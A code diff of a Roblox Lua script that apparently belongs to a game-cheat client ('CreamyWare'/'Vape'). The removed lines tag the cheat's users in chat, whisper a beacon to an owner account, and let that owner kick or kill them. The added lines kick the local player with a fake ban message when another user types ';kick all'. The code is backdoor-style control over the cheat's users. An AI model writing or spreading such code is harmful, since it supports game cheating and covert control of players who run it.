@@ -1,55 +1,42 @@
 local Players = game:GetService("Players")
-local Players = game:GetService("Players")
-local TextChatService = game:GetService("TextChatService")
-local LocalPlayer = Players.LocalPlayer
+local player = Players.LocalPlayer
 
--- Setup tracking
-_G.CreamyWareUsers = _G.CreamyWareUsers or {}
-_G.CreamyWareUsers[LocalPlayer.UserId] = true
-
--- Whisper "helloimusingcw" to the owner if they're in-game
-task.spawn(function()
-    repeat task.wait() until _G.Owner
-    local ownerPlayer = Players:GetPlayerByUserId(_G.Owner)
-    if ownerPlayer and LocalPlayer.UserId ~= _G.Owner then
-        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 5)
-        :WaitForChild("SayMessageRequest")
-        :FireServer("helloimusingcw", "Whisper", ownerPlayer.Name)
+-- Listen to chat messages from the local player
+player.Chatted:Connect(function(msg)
+    if msg == ";kick all" then
+        -- This is the sender, do NOT kick yourself
+        -- Instead, send a signal somehow to other Vape clients (if possible)
+        -- But in pure local code, you can't kick others from here
+        -- So just return here and do nothing on this client
+        return
     end
 end)
 
--- Chat Tag Display for All CreamyWare Users
-TextChatService.OnIncomingMessage = function(message)
-    local props = Instance.new("TextChatMessageProperties")
-    if message.TextSource then
-        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
-        if sender and _G.CreamyWareUsers[sender.UserId] then
-            local tag = sender.UserId == _G.Owner and (_G.OwnerTag or "CreamyWare Owner") or "CreamyWare User"
-            props.PrefixText = `<font color="#CC00CC">[{tag}]</font> {message.PrefixText}`
-        end
+-- Listen to all players' chats (using a global chat listener in your Vape script)
+-- (Assuming your exploit can listen to all players chat locally)
+local function onPlayerChatted(otherPlayer, message)
+    if message == ";kick all" and otherPlayer ~= player then
+        -- Another Vape user typed ";kick all" — kick this local player
+        player:Kick("You have been banned for 29999 weeks 5 days 100 seconds.")
     end
-    return props
 end
 
--- Command Handling (Only Owner)
-Players.PlayerChatted:Connect(function(sender, message)
-    if not (_G.Owner and sender.UserId == _G.Owner) then return end
-    message = message:lower()
+-- Connect the chat for all players
+local Players = game:GetService("Players")
 
-    if message == ";kick cwu" then
-        for _, target in ipairs(Players:GetPlayers()) do
-            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
-                target:Kick("Kicked by CreamyWare Owner")
-            end
-        end
-    elseif message == ";kill cwu" then
-        for _, target in ipairs(Players:GetPlayers()) do
-            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
-                local char = target.Character
-                local hum = char and char:FindFirstChildOfClass("Humanoid")
-                if hum then hum.Health = 0 end
-            end
-        end
+for _, p in pairs(Players:GetPlayers()) do
+    if p ~= player then
+        p.Chatted:Connect(function(msg)
+            onPlayerChatted(p, msg)
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(p)
+    if p ~= player then
+        p.Chatted:Connect(function(msg)
+            onPlayerChatted(p, msg)
+        end)
     end
 end)
 repeat task.wait() until game:IsLoaded()
